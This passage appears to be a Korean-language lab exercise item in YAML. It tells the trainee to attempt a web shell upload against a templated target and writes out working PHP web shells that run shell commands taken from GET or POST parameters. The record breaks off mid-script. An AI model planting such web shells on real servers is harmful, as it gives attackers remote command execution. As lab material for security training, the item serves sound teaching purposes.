- order: 6
  instruction: |-
    {{WEB_IP}} 대상으로 웹쉘 업로드 시도를 수행하시오.

    ■ 실습 방법

    ▶ 1단계: 도구 A — 간이 PHP 웹쉘 (수동)
    ```bash
    # 1줄 웹쉘 (가장 단순)
    echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php

    # POST 본문에서 명령 받음
    cat > /tmp/shell.php <<'EOF'
    <?php
    if (isset($_POST['cmd'])) {
        echo "<pre>";
        system($_POST['cmd']);
        echo "</pre>";
    }
